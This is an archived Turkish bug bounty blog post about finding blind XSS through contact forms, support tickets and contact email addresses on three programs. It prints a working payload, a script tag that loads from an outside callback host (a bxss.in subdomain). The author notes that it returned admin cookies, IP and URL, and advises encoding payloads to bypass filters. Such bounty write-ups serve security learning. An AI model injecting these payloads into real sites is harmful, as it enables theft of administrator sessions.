# Ödül Avcılığı — Blind XSS $$$

- **Source URL:** https://medium.com/@el-cezeri/%C3%B6d%C3%BCl-avc%C4%B1l%C4%B1%C4%9F%C4%B1-blind-xss-89abb59f5cbf?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230311212114/https://medium.com/@el-cezeri/%C3%B6d%C3%BCl-avc%C4%B1l%C4%B1%C4%9F%C4%B1-blind-xss-89abb59f5cbf?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1947 (id 1947)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Ödül Avcılığı — Blind XSS $$$

Herkese Merhaba ! Ödül Avcılığı sürecinde öğrendiklerimi hem uygulayıp hem paylaşmaya devam ediyorum [😃](https://web.archive.org/web/20230311212114/https://emojipedia.org/grinning-face-with-big-eyes/) . 3 Farklı programda bu açığı nasıl buldum ve nasıl istismar ettim ? Tüm detaylarına beraber göz atalım …

# **Öncelikle Blind XSS Nedir ?**

Stored XSS açıklarının bir türü olan blind XSS , saldırganın girdiği zararlı komutu barındıran yükü sunucu tarafından kaydedildiğinde ve uygulamanın bir bölümünde çalıştırıldığında ortaya çıkar . Peki daha çok nerelerde rastlayabiliriz ?

**→İletişim Sayfalarında**

**hedefadres.com/contactus** veya **hedefadres.com/iletisim** gibi .

**→İletişim için sundukları mail adreslerinde**

örneğin **hedefadres@sirket.com** gibi bir mail adresinde.

→**Müşteri Destek biletlerinde** kısacası sitenin geri bildirim aldığı çoğu yerde diyebiliriz

Bu güvenlik açığında diğer xss türleri gibi hızlıca sonuç beklemeyeceğiz. Yükümüzü göndereceğiz ve eğer şansımız yaver giderse kısa bir süre içerisinde yönetici ilettiğimiz desteğe tıklarsa , ya da tetiklenmesi için yöneticinin tıklaması vs gibi durumlar gerçekleşmesi gerekmektedir.

Blind XSS yükleri için bu hizmeti ücretsiz olarak sunan birkaç siteyi buraya bırakıyorum . (XSSRepor tercih ediyorum )

- **→ XSS Hunter**
- **→** [**BXSS Hunter**](https://web.archive.org/web/20230311212114/https://bxsshunter.com/)
- [**→XSSReport**](https://web.archive.org/web/20230311212114/https://xss.report/)

# 1 ) hedefadres.com Ödül:$$$

hedefadres.com için idor , sql vb. çoğu şeyi denedikten sonra hiçbir şey bulamadım . Daha sonra hedefadres.com/bizeulasin gibi bir alt alan olduğunu ve buradan kullanıcıdan bir geri dönüt aldıklarını fark ettim . Hızlıca BXSS giderek yükümü kopyaladım

Örnek olarak kullandığım yüklerden bir tanesi :

**”>\<script src=https://KULLANICI ADINIZ.bxss.in>\</script>**

ve İsim , adres ve mesaj bölümlerine birkaç farklı yükü kopyalayıp göndermeye çalıştım ve herhangi bir kısıtlama olmadan başarılı bir şekilde mesajım iletildi. Biraz bekleyceğimi biliyordum ama bu sefer şanslıydım çünkü 1 saat sonra yükümün tetiklendiğine dair mail aldım :)

Hedef ip ,url port oturum açmak için cookies vb bilgilerin hepsi …

Hızlıca bir rapor hazırladım ve gönderdim bunun için $$$ ile ödüllendirildim :) .

# 1 ) hedefadres2.com Ödül:$$$

Farklı bir programda gezinirken tekrardan hızlıca /iletisim sayfasında aynı şeyi denedim fakat bu sefer gönderilemedi hatası alıyorum . Vazgeçmek yok :) Hızlıca yükümü kopyaladım ve yükümü encode ettikten sonra göndermeyi denedim . Bir hafta geçtikten sonra yükümün tetiklendiğine dair bir mail aldım

Yükünüzü encode edip göndermeyi denemelisiniz :)

# 1 ) hedefadres3.com Ödül:$$$

Son olarak epeydir rapor gönderilmemiş bir programa göz atıyordum . Ve hiçbir şey bulamadım . Profilimde destek bileti oluşturabileceğimi fark ettim :) . Evet tahmin ettiğiniz gibi hızlıca yüklerimi kopyalayıp gönderdim ve birkaç gün sonra yükümü tetiklendiğine dair mail aldım .

(+ İpucu: İletişim adreslerinde mail adresleri mevcut ise mail adreslerine de yükleri kopyalayıp göndermeyi deneyebilirsiniz :) )

**Etkisi**

**Alıntı** “Blind XSS güvenlik açıkları, stored XSS güvenlik açıklarının bir çeşididir. Saldırganın girdiği zararlı komutlar barındıran payload web sunucusu tarafından kaydedildiğinde ve uygulamanın başka bir bölümünde çalıştırıldığında ortaya çıkar. Örneğin, bir saldırgan bir iletişim/geri bildirim sayfasına kötü niyetli bir payload enjekte eder ve uygulamanın yöneticisi geri bildirimleri incelerken saldırganın zararlı komutları çalıştırılır. Saldırganın girdiği komutlar, tamamen farklı bir uygulamada da yürütülebilir.”

**Toplamda bu üç farklı program için $$$$ gibi bir miktar ile ödüllendirildim .**

Görüşmek dileğiyle ,sağlıcakla kalın… ❤
